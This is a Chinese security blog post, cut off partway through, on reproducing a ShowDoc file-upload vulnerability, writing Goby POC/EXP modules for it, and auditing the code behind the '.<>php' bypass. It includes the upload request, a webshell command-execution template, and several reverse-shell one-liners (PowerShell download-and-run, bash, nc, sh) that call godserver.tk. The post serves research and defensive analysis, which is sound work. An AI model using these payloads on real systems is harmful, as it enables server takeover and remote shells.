    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最初只是简单的搭建环境，拿着公开的POC复现漏洞。然后想着学学Goby如何编写POC&amp;EXP，先拿GUI的形式编写，但是逐渐发现很多想法都满足不了，于是尝试Go语言编写。但也不满足于此，想去探究漏洞成因于是选择代码审计，最后对漏洞成因进行跟踪溯源，得出一个较为满意的结论！</p><h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h1><h2 id="1-1-漏洞速览"><a href="#1-1-漏洞速览" class="headerlink" title="1.1 漏洞速览"></a>1.1 漏洞速览</h2><p>漏洞描述：Showdoc存在文件上传漏洞，攻击者可以利用漏洞获取服务器权限。</p><p>漏洞影响：ShowDoc &lt; V2.8.3</p><p>漏洞参考：<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585">https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585</a></p><h2 id="1-2-环境搭建"><a href="#1-2-环境搭建" class="headerlink" title="1.2 环境搭建"></a>1.2 环境搭建</h2><p>系统：Windows10</p><p>工具：PHPStudy2016，VScode，Goby，Burp</p><p>环境：showdoc-V2.6.7  <a href="https://github.com/star7th/showdoc">https://github.com/star7th/showdoc</a></p><h2 id="1-3-POC"><a href="#1-3-POC" class="headerlink" title="1.3 POC"></a>1.3 POC</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsx">POST /index.php?s=<span class="hljs-regexp">/home/</span>page/uploadImg HTTP/<span class="hljs-number">1.1</span><br><span class="hljs-attr">Host</span>: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">81</span><br>Content-Type: multipart/form-data; boundary=---------------------------<span class="hljs-number">346031065719027724703329952952</span><br>Content-Length: <span class="hljs-number">252</span><br><span class="hljs-attr">Connection</span>: close<br><br>-----------------------------<span class="hljs-number">346031065719027724703329952952</span><br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;editormd-image-file&quot;</span>; filename=<span class="hljs-string">&quot;1.&lt;&gt;php&quot;</span><br>Content-Type: text/plain<br><br>&lt;?php phpinfo();?&gt;<br>-----------------------------<span class="hljs-number">346031065719027724703329952952</span>--<br></code></pre></td></tr></table></figure><h2 id="1-4-复现"><a href="#1-4-复现" class="headerlink" title="1.4 复现"></a>1.4 复现</h2><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled.png"></p><h1 id="2-利用Goby的GUI编写POC-amp-EXP"><a href="#2-利用Goby的GUI编写POC-amp-EXP" class="headerlink" title="2. 利用Goby的GUI编写POC&amp;EXP"></a>2. 利用Goby的GUI编写POC&amp;EXP</h1><h2 id="2-1-编写POC"><a href="#2-1-编写POC" class="headerlink" title="2.1 编写POC"></a>2.1 编写POC</h2><h3 id="2-1-1-填入基本内容"><a href="#2-1-1-填入基本内容" class="headerlink" title="2.1.1 填入基本内容"></a>2.1.1 填入基本内容</h3><p>可以手动输入，但是由于该漏洞有CNVD编号，于是考虑从命令行导入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//在goby的golib目录下的goby-cmd文件，也可以-h解锁更多操作</span><br>goby-cmd -mode genpoc -CNVDID CNVD-<span class="hljs-number">2020</span>-<span class="hljs-number">26585</span> -exportFile exploits\user\CNVD-<span class="hljs-keyword">export</span>.go<br><span class="hljs-comment">//导出文件在goby的\golib\exploits\user目录下</span><br></code></pre></td></tr></table></figure><p>已知BUG：</p><ol><li>通过命令行导出的文件需要手动加上指纹：<code>&quot;GobyQuery&quot;: &quot;app=\&quot;showDoc\&quot;&quot;</code> ，才可以导入进Goby，不然导入不进去，会报错（在log中可以看到报错信息）</li><li>通过命令行导出的文件导入POC时，测试界面会出现白屏bug，因为ScanSteps中缺少<code>&quot;SetVariable&quot;: []</code> 字段，添加即可。</li></ol><blockquote><p>不想拘泥于手动，虽然导入遇到了不少的麻烦，但是总归是需要尝试的，后续Goby团队也会改进的。</p></blockquote><h3 id="2-2-2-发出请求"><a href="#2-2-2-发出请求" class="headerlink" title="2.2.2 发出请求"></a>2.2.2 发出请求</h3><p>简单的将POC内容复制粘贴进对应字段即可</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%201.png"></p><h3 id="2-2-3-验证响应"><a href="#2-2-3-验证响应" class="headerlink" title="2.2.3 验证响应"></a>2.2.3 验证响应</h3><p>参考Goby<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E5%87%86%E7%A1%AE%E6%80%A7">《PoC writing suggestions》中的准确性</a>：增加检测关键字、特殊符号、响应包中独一无二的特征，以提高其准确性。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%202.png"></p><h3 id="2-2-4-编写POC的Tips"><a href="#2-2-4-编写POC的Tips" class="headerlink" title="2.2.4 编写POC的Tips"></a>2.2.4 编写POC的Tips</h3><ol><li>修改POC之后记得保存后，再进行单IP测试</li><li>由于Goby可能因为缓存等机制，导致修改POC并保存之后，即使发包也是未修改之前的包，需要返回漏洞管理界面再重新载入POC才行</li><li>由于上述载入载出步骤较为麻烦，我采用<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF%E8%84%9A%E6%89%8B%E6%9E%B6%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D">Goby脚手架</a>的方式，在VSCode修改代码的同时在CMD中测试： <code>goby-cmd -mode runpoc -operation scan -pocFile exploits\user\a.go -target 127.0.0.1</code></li><li>脚手架的方式不支持burp代理调试。如果需要对POC进行代理调试的话，推荐依然使用GUI的方法，详见<a href="https://mp.weixin.qq.com/s/IeftOSV29DbDgeClqXqnkg">《Json 编写 PoC&amp;EXP 遇到的那些坑》</a></li></ol><h2 id="2-2-编写EXP"><a href="#2-2-编写EXP" class="headerlink" title="2.2 编写EXP"></a>2.2 编写EXP</h2><p>总体思路同上POC的问题，只不过将上传的验证性文件切换为一句话、菜刀等类型木马文件，然后在浏览器中访问对应连接即可。</p><p>仔细查看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%BC%96%E5%86%99">官方文档的EXP部分</a> ，实际操作步骤如下：</p><ol><li>将 <code>HasExp</code> 字段设置为 true</li><li>在POC界面编写EXP后，在编辑器中将<code>ScanSteps</code>对应代码复制粘贴到<code>ExploitSteps</code> </li><li>上传文件内容更改为冰蝎马，上传一句话木马同理</li><li>直接将返回的链接扔到冰蝎里面连接即可。</li></ol><p>已知问题：</p><ol><li>GobyGUI目前暂不支持EXP用GUI编写，借用POC界面编写后，在编辑器中将<code>ScanSteps</code>对应代码复制粘贴到<code>ExploitSteps</code> </li><li>抓包问题：pcap模式扫描127.0.0.1无IP存活，但是socket模式下可以扫127.0.0.1</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%203.png"></p><h2 id="2-3-进一步优化POC-amp-EXP"><a href="#2-3-进一步优化POC-amp-EXP" class="headerlink" title="2.3 进一步优化POC&amp;EXP"></a>2.3 进一步优化POC&amp;EXP</h2><h3 id="2-3-1-自动删除上传文件"><a href="#2-3-1-自动删除上传文件" class="headerlink" title="2.3.1 自动删除上传文件"></a>2.3.1 自动删除上传文件</h3><p>在公网测试的时候，发现一个很不好的现象：某站点上存在大量这类一句话木马。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%204.png"></p><p>参考Goby<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E6%97%A0%E5%AE%B3%E6%80%A7">《PoC writing suggestions》的无害性</a>： 我们需要将上传的文件进行删除。虽然第一次第二次很麻烦，但是优秀是需要形成习惯的。</p><p>问题：</p><ol><li>如何删除上传文件？PHP中可以利用<code>unlink()</code>函数来删除文件</li><li>如何触发<code>unlink()</code>函数？连续发出两次请求。第一次请求用于上传文件，第二次请求用于触发<code>unlink()</code>函数删除文件</li><li>如何获取第二次请求的链接？第一次的返回包中有返回绝对路径，且Goby可以基于正则提取第一次请求的响应，并在第二次利用，详见Goby<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#json-%E5%BD%95%E5%85%A5%E6%BC%8F%E6%B4%9E%E9%80%BB%E8%BE%91%E6%89%8B%E5%86%8C">《POC编写指南之JSON 录入漏洞逻辑手册》</a></li><li>如何编写正则？先百度正则语法，再用<a href="https://regex101.com/">regex101平台</a>进行测试</li><li>如何去掉链接<code>/\</code>这些符号？化繁为简，分析文件路径组成：Hostinfo+Public/Uploads+日期+随机文件名，后两个变量分两次正则提取，然后整体拼接即可</li></ol><p>问题解决了，步骤自然清晰：</p><ol><li>在上传的文件末尾增加<code>unlink()</code>函数</li><li>在第一次请求的正则部分增加自定义变量<code>date</code>和<code>file</code></li><li>在Goby中添加第二次请求的URL中使用这两个变量<code>/Public/Uploads/&#123;&#123;&#123;date&#125;&#125;&#125;/&#123;&#123;&#123;file&#125;&#125;&#125;</code></li><li>如果第二次响应为200即可算作成功</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%205.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%206.png"></p><h3 id="2-3-2-提高POC的准确性"><a href="#2-3-2-提高POC的准确性" class="headerlink" title="2.3.2 提高POC的准确性"></a>2.3.2 提高POC的准确性</h3><p><strong>问题</strong>：既然可以发出第二次请求，不仅可以触发<code>unlink()</code>函数，是否可以考虑增加一些<code>echo</code>操作进一步提高POC的准确性？</p><p><strong>思路：</strong>在php文件中echo一段随机数，然后第二次请求在响应判断的时候，不仅只是判断响应为200，也匹配是否这段随机数？</p><p>问题解决了，步骤自然清晰。虽然第一次返回匹配到success等字段即可验证POC成功，第二步echo再一下有些多余，但是我想以后肯定某个地方需要用的，先学着。</p><p><strong>已知问题</strong>：由于目前Goby GUI并不支持随机数，所以只能手动输入一个固定数然后进行判断。(Goby团队后续会在GUI中增加随机数选项)</p><h3 id="2-3-3-优化一句话木马"><a href="#2-3-3-优化一句话木马" class="headerlink" title="2.3.3 优化一句话木马"></a>2.3.3 优化一句话木马</h3><p><strong>新需求</strong>：上传冰蝎类的马简单，上传一句话木马类似，但是之前的方式需要在浏览器或冰蝎中打开链接进行操作，有些繁琐。针对一句话木马如果只想在GobyGUI中操作，不需要新打开浏览器中转，肯定更优雅更简洁，那么如何操作？</p><p><strong>需求拆解</strong>：实现动态一句话木马：①在木马文件中动态插入一句话命令②触发木马文件并获取返回值</p><p><strong>问题</strong>：</p><ol><li>如何在上传文件中动态插入参数？查看文档后发现：Goby提供<code>ExpParams</code> 字段来让用户自定义所需传递参数，且和自定义参数逻辑一样，<code>&#123;&#123;&#123;&#125;&#125;&#125;</code>包裹即可在json任意位置使用该变量，比如<code>&lt;?php system(&quot;&#123;&#123;&#123;cmd&#125;&#125;&#125;&quot;);unlink(); ?&gt;</code>,即可实现一句话木马的操作</li><li>如何触发木马并返回值？和前面类似，发送二次请求即可</li></ol><p>Trick：</p><ol><li>Goby发包逻辑是每次先POC后EXP，更改EXP后又要重新走一遍扫描流程，很麻烦，有其他直接验证EXP的操作吗？Goby-cmd.exe脚手架中不仅提供scan操作，也提供exploit操作，且exploit操作支持<code>-params &#39;&#123;&quot;cmd&quot;:&quot;whoami&quot;&#125;&#39;</code> 参数。</li><li>输入命令<code>goby-cmd -mode runpoc -operation exploit -pocFile exploits\user\a.go -target 127.0.0.1 -params &quot;&#123;\&quot;cmd\&quot;:\&quot;whoami\&quot;&#125;&quot;</code> 即可直接验证EXP。</li><li>在cmd模式下验证EXP无误，切换到GUI界面进行扫描，EXP验证成功！</li></ol><p>已知BUG：</p><ol><li>发包BUG：在json编写EXP需要连续发两个包的情况下，即使内容编写正确的情况下依然可能会检测失败。需要在ExploitSteps的第一个请求的<code>SetVariable</code> 键中额外加入<code>&quot;output|lastbody&quot;</code>值，才会成功执行第二个请求，进而检测成功。（前面《2.3.1 自动删除上传文件》部分用的仅仅只有POC，没用到EXP这一步，所以未产生BUG）</li><li>系统差异BUG：windows下cmd中使用<code>-params &#39;&#123;&quot;cmd&quot;:&quot;whoami&quot;&#125;&#39;</code> 参数会报错<code>invalid character &#39;\&#39;&#39; looking for beginning of value</code> ，改为<code>&quot;&#123;\&quot;cmd\&quot;:\&quot;whoami\&quot;&#125;&quot;</code> 即可</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%207.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%208.png"></p><h1 id="3-用Go语言编写Goby的POC"><a href="#3-用Go语言编写Goby的POC" class="headerlink" title="3. 用Go语言编写Goby的POC"></a>3. 用Go语言编写Goby的POC</h1><h2 id="3-1-迈出第一步：学用Go语言"><a href="#3-1-迈出第一步：学用Go语言" class="headerlink" title="3.1 迈出第一步：学用Go语言"></a>3.1 迈出第一步：学用Go语言</h2><p>使用GUI时遇到的痛点</p><ol><li>部分功能缺失：无法使用随机数</li><li>缺少DIY需求：对于返回的<code>\/Public\/Uploads\/2021-06-24\/</code> 这类链接无法直接使用，需要手动剔除转移符号</li><li>黑盒的未知性：单纯看Json并不能掌控POC后续是怎么被载入和利用的，没有Go代码看起来的直观可控</li><li>BUG：不少BUG是因为Json中缺少某个键值，但是判断又很难判断，而Go代码更加可控。</li></ol><p><strong>困难：</strong></p><ol><li>上述Poc难吗？不难，不过是发出请求罢了。</li><li>不会Go语言怎么办？只是发出一个请求罢了，官方也提供了code demo，只需要改下URI即可完成轮子搭建。详见<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#golang-%E4%BB%A3%E7%A0%81%E5%BD%95%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C">Goby《Vulnerability-writing-guide》之golang-代码录入漏洞手册</a></li></ol><p>虽然我不会Go，但是因为上面的痛点，还是想克服困难，迈出那第一步。</p><p><strong>思路：</strong></p><ol><li>化繁为简：先写POC，POC写好了，EXP自然写好了。</li><li>根据官方的demo，改下POC中的Uri，改下匹配的关键字</li><li>测试即可</li></ol><p>具体不表，造轮子而已。</p><h2 id="3-2-进一步：优化POC"><a href="#3-2-进一步：优化POC" class="headerlink" title="3.2 进一步：优化POC"></a>3.2 进一步：优化POC</h2><h3 id="3-2-1-用Go语言实现高级需求"><a href="#3-2-1-用Go语言实现高级需求" class="headerlink" title="3.2.1 用Go语言实现高级需求"></a>3.2.1 用Go语言实现高级需求</h3><p>刚才只是简单的request，想要完成更高的需求，比如前面Json部分对POC的优化</p><p><strong>问题</strong>：</p><ol><li>Go如何实现两次请求达到删除的效果？把发出请求的代码Copy一次，if第一次成功，发出第二次请求，if第二次请求成功，return true。</li><li>Go如何使用正则？仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%AF%87%E5%86%99">官方文档</a> ，发现其使用了<code>regexp.MustCompile()</code> ，百度搜用法，先新建regex.go文件本地测试，熟悉用法后写入POC测试</li><li>Go如何拼接变量？仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%AF%87%E5%86%99">官方文档</a> ，发现其使用了<code>fmt.Sprintf(&quot;%s&quot;,var）</code> ，百度搜用法，先新建fmt.go文件本地测试，熟悉用法后写入POC测试</li><li>Go如何实现随机数？因为前面GUI编写只能固定数，存在被检测特征，仔细看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#goutils">官方文档</a> ，发现其使用<code>RandomHexString()</code>生成随机字符串，将固定数替换为随机数变量即可</li><li>Go能否将冰蝎上传后返回链接自动优化，而不是手动删除转义符号？既然我们可以通过拼接<code>date</code>和<code>file</code> 形成第二次请求的链接，那么我们也可以冰蝎的输出的内容改为这个链接：<code>expResult.Output =fmt.Sprintf(&quot;%s/Public/Uploads/%s/%s&quot;, expResult.HostInfo, date[1], file[1])</code> </li><li>Go能否进一步减少POC特征？前面提及不少网上木马的key为<code>peiqi</code> ,此处也可以利用<code>RandomHexString()</code> 的方式随机生成key，然后在第二次使用后删除该文件，实现一次一密的效果。当然<code>boundary=-------xxxxx</code> 字段也可以通过<code>RandomHexString()</code> 来实现随机性。</li></ol><p>一步步的查看文档、测试，发现Go语言编写POC&amp;EXP时，内容和行为更可控，也能实现更多自定义需求，需要的Go语言基础也不高，个人觉得比目前GUI的Json编写更加方便。（后续Goby团队会改进GUI并实现这些需要用Go才能满足需求）</p><h3 id="3-2-2-执行一句话命令"><a href="#3-2-2-执行一句话命令" class="headerlink" title="3.2.2 执行一句话命令"></a>3.2.2 执行一句话命令</h3><p>Goby红队版本就是执行一句话回显命令的方式</p><p><strong>问题：</strong></p><ol><li>Goby如何自定义参数？前面已经介绍了，在Json中的<code>ExpParams</code> 字段来让用户自定义所需传递参数</li><li>Go中如何获取到自定义参数?查看文档发现，可以使用<code>ss.Params[&quot;cmd&quot;].(string)</code>的形式获取参数</li><li>Go中如何将自定义参数输入到payload中？利用前面提及的<code>fmt.Sprintf(&quot;%s&quot;,var）</code> 方式</li></ol><h3 id="3-2-3-更进一步：直接反弹shell"><a href="#3-2-3-更进一步：直接反弹shell" class="headerlink" title="3.2.3 更进一步：直接反弹shell"></a>3.2.3 更进一步：直接反弹shell</h3><p><strong>想法</strong>：既然可以一句话木马，而大部分时间我们生成一句话木马之后第二步就是反弹shell，那么为什么第二次不直接执行反弹shell，难道不比执行一句话命令好？</p><p><strong>问题</strong>：</p><ol><li>如何实现（思路上）？将一句话木马的paylod部分由自定义参数命令的方式直接改为反弹shell的命令即可</li><li>如何实现（实际操作）？查看Goby提供<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-goby-%E7%9A%84-godserver-%E5%8F%8D%E5%BC%B9-shell">反弹shell的demo</a> 文档，然后魔改为自己需要的即可</li><li>为什么可以反弹shell，但是所上传文件无法自动删除，<code>unlink()</code> 函数没触发？因为先执行命令再执行<code>unlink()</code>函数，而前者shell在反弹过程中堵塞了进程，百度后发现可<a href="https://www.php.net/manual/en/function.exec.php#86329">采取<code>popen()</code>启动子进程</a>的方式。(有趣的是，通过该文档，我了解到可以通过<code>php_uname()</code> 来判断服务器主机系统，进而根据不同系统动态生成payload的操作)（GobyShell只有10分钟存活，也可以保证不会长期驻留服务器进程）</li></ol><p>我先在本地测试PHP载荷可以实现反弹shell的效果(详见下图)，然后再在Go语言中实现。</p><blockquote><p>和go0p师傅交流之后，我发现我的想法是错的：我急于直接看到反弹shell的效果，只是因为我的测试环境允许。在实战情况下，目标可能不出网，Godserver服务器可能有一定的问题等等，导致反弹shell不一定在所有环境下都是可以成功的，所以EXP能使用一句话木马回显就用一句话木马回显，其次才考虑其他验证方式。参考<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AE%AE">《GobyPOC编写建议之其他建议》</a></p></blockquote><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//Goby生成的godserver相关命令</span><br><span class="hljs-comment">//ReverseTCPByPowershell</span><br>powershell IEX (New-<span class="hljs-built_in">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://godserver.tk/ps/rs.ps1&#x27;</span>);rs -H godserver.tk -P <span class="hljs-number">35355</span><br><span class="hljs-comment">//ReverseTCPByBash</span><br>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp/godserver.tk/<span class="hljs-number">35355</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-comment">//ReverseTCPByNcBsd</span><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc godserver.tk <span class="hljs-number">35355</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br><span class="hljs-comment">//ReverseTCPBySh</span><br><span class="hljs-number">0</span>&lt;&amp;<span class="hljs-number">1</span>-;exec <span class="hljs-number">1</span>&lt;&gt;<span class="hljs-regexp">/dev/</span>tcp/godserver.tk/<span class="hljs-number">35355</span>;sh -i &lt;&amp;<span class="hljs-number">1</span> &gt;&amp;<span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%209.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2010.png"></p><h2 id="3-3-最终效果"><a href="#3-3-最终效果" class="headerlink" title="3.3 最终效果"></a>3.3 最终效果</h2><p>代码放在仓库：<a href="https://github.com/corp0ra1/showDocDemo">https://github.com/corp0ra1/showDocDemo</a></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled.gif"></p><h2 id="3-4-发散思维"><a href="#3-4-发散思维" class="headerlink" title="3.4 发散思维"></a>3.4 发散思维</h2><p>上述操作基本把Goby提供的功能基本都尝试了个遍，就剩下个DNSLOG也尝试一下？比如第二次请求之后不通过返回值判断而是根据DNSLOG的结果？</p><h1 id="4-更进一步-代码审计-TL-DR"><a href="#4-更进一步-代码审计-TL-DR" class="headerlink" title="4. 更进一步-代码审计 TL;DR"></a>4. 更进一步-代码审计 TL;DR</h1><p>上述操作只是完成了漏洞的复现，以及POC&amp;EXP的编写，但是心中还是有疑问</p><ul><li>为什么文件名后缀使用<code>.&lt;&gt;php</code>就可以绕过?</li><li>为什么我尝试<code>.&lt;php</code>的后缀绕过方式不行？</li><li>为什么有这种神奇的绕过方法？</li><li>什么原因导致的？</li></ul><p>十万个为什么，最终促使了我进行代码审计！</p><blockquote><p>不会代码审计，只能一步步的断点跟踪分析，笨办法</p></blockquote><h2 id="4-1-showdoc如何限制文件上传的"><a href="#4-1-showdoc如何限制文件上传的" class="headerlink" title="4.1 showdoc如何限制文件上传的"></a>4.1 showdoc如何限制文件上传的</h2><h3 id="4-1-1-先黑名单检测"><a href="#4-1-1-先黑名单检测" class="headerlink" title="4.1.1 先黑名单检测"></a>4.1.1 先黑名单检测</h3><p>检测文件名中是否包含php字样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">strstr(strtolower(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;editormd-image-file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2011.png"></p><h3 id="4-1-2-再白名单检测"><a href="#4-1-2-再白名单检测" class="headerlink" title="4.1.2 再白名单检测"></a>4.1.2 再白名单检测</h3><p>检测文件后缀名是否在upload类的<code>$ext</code>数组白名单中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;exts&#x27;</span>]) ? <span class="hljs-literal">true</span> : in_array(strtolower(<span class="hljs-variable">$ext</span>), <span class="hljs-keyword">$this</span>-&gt;exts);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2012.png"></p><h3 id="4-1-3-最后图片内容检测"><a href="#4-1-3-最后图片内容检测" class="headerlink" title="4.1.3 最后图片内容检测"></a>4.1.3 最后图片内容检测</h3><p>仅对图像文件进行进一步检测，其他类型则放行（有些鸡肋）</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2013.png"></p><h2 id="4-2-绕过方法一：畸形后缀绕过"><a href="#4-2-绕过方法一：畸形后缀绕过" class="headerlink" title="4.2 绕过方法一：畸形后缀绕过"></a>4.2 绕过方法一：畸形后缀绕过</h2><h3 id="4-2-1-绕过方式"><a href="#4-2-1-绕过方式" class="headerlink" title="4.2.1 绕过方式"></a>4.2.1 绕过方式</h3><p>文件名为：<code>test.&lt;&gt;php</code></p><h3 id="4-2-2-原理"><a href="#4-2-2-原理" class="headerlink" title="4.2.2 原理"></a>4.2.2 原理</h3><p><code>.&lt;&gt;php</code>的方式绕过了黑名单对<code>.php</code>检测</p><p>而在之后的showdoc\server\ThinkPHP\Library\Think\Upload.class.php 的<code>upload()</code>函数中对文件名使用了<code>strip_tags()</code>函数进行处理，去掉了<code>&lt;&gt;</code>标签，还原后缀名为php。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2014.png"></p><h3 id="4-2-3-修复方案"><a href="#4-2-3-修复方案" class="headerlink" title="4.2.3 修复方案"></a>4.2.3 修复方案</h3><p>在进行黑名单检测时，先用<code>strip_tags()</code>函数对输入文件名进行处理（有趣的是我在另外一个路径下的同名文件中发现了这种修复方案）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 